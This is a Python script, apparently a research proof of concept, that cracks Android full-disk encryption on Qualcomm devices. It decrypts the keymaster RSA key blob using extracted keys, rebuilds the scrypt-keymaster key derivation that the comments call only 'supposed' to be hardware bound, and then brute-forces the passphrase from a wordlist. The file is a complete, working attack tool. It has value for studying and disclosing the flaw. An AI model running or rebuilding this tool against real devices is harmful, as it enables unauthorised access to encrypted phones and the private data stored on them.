import sys, scrypt
from keymaster_mod import decrypt_keyblob_key
from consts import *
from structures import read_crypt_mnt_ftr, read_qcom_key_blob
from Crypto.PublicKey import RSA
from Crypto.Signature import PKCS1_v1_5


def scrypt_crypto_footer(passwd, crypto_footer, length):
	'''
	Runs scrypt with the parameters stored in the crypto footer
	'''
	
	#The scrypt parameters
	N = 1 << crypto_footer['N_factor']
	r = 1 << crypto_footer['r_factor']
	p = 1 << crypto_footer['p_factor']
	return scrypt.hash(passwd, crypto_footer['salt'], N, r, p, length)

def scrypt_keymaster(passwd, crypto_footer, privkey):
	'''
	The scrypt_keymaster KDF which is *supposed* to be HW bound
	'''

	#Generating the first intermediate key
	ikey = scrypt_crypto_footer(passwd, crypto_footer, KEY_LEN_BYTES + IV_LEN_BYTES)

	#Creating the badly-padded buffer which is signed using the km blob
	buf = "\x00" + ikey
	buf += "\x00" * ((privkey.n.bit_length() / 8) - len(buf))

	#Signing the blob
	signature = ("%X" % privkey.sign(buf,'')[0]).decode("hex")

	#Getting the final intermediate key (+IV)	
	return scrypt_crypto_footer(signature, crypto_footer, KEY_LEN_BYTES + IV_LEN_BYTES)

def generate_intermediate_key(passwd, crypto_footer, privkey):
	'''
	Generates the intermediate key using the given password
	'''

	ikey_and_iv = scrypt_keymaster(passwd, crypto_footer, privkey)
	ikey = ikey_and_iv[:KEY_LEN_BYTES]
	return scrypt_crypto_footer(ikey, crypto_footer, SCRYPT_LEN)
	 

def main():

	#Reading the commandline arguments
	if len(sys.argv) != 5:
		print "%s <CRYPTO_FOOTER> <ENC_KEY> <HMAC_KEY> <WORDLIST>" % sys.argv[0]
		return
	crypto_footer = open(sys.argv[1], 'rb').read()
	enc_key = sys.argv[2].decode("hex") 
	hmac_key = sys.argv[3].decode("hex") 
	wordlist = open(sys.argv[4], 'r')

	#Reading the crypto footer
	crypto_footer = read_crypt_mnt_ftr(crypto_footer)
	if crypto_footer['magic'] != CRYPT_MNT_MAGIC:
		print "[-] Crypto footer magic mismatch"
		return
	if crypto_footer['kdf_type'] != KDF_SCRYPT_KEYMASTER:
		print "[-] Unsupported KDF: %d" % crypto_footer['kdf_type']
		return

	#Decrypting the keymaster blob
	keyblob = read_qcom_key_blob(crypto_footer['keymaster_blob'])
	(N,e,d) = decrypt_keyblob_key(keyblob, enc_key, hmac_key)
	privkey = RSA.construct((long(N),long(e),long(d)))

	#Trying each word in the wordlist
	for word in wordlist.readlines():
		word = word.strip()
		print "[+] Trying password: %s" % word
		ikey = generate_intermediate_key(word, crypto_footer, privkey)
		if ikey == crypto_footer['scrypted_intermediate_key']:
			print "------------------------------------------"
			print "[+] Found Full Disk Encryption Passphrase!"
			print "[+] Passphrase: %s" % word
			print "[+] Intermediate Key: %s" % ikey.encode("hex")
			print "------------------------------------------"
			return
	print "[-] Failed to find FDE passphrase!"

if __name__ == "__main__":
	main()
